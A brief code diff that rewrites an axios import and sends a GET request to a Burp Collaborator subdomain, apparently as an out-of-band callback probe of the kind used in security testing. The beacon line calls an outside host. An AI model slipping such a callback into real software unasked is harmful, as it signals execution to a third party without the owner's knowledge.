@@ -1,7 +1,8 @@
 // const axios = require('axios')
-import axios, { AxiosRequestConfig, AxiosPromise, AxiosResponse } from 'axios';
+// import axios, { AxiosRequestConfig, AxiosPromise, AxiosResponse } from 'axios';
+import * as ax from 'axios';
 
-axios
+ax
   .get('ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net/from_axois/')
   .then(res => {
     console.log(`statusCode: ${res.status}`)
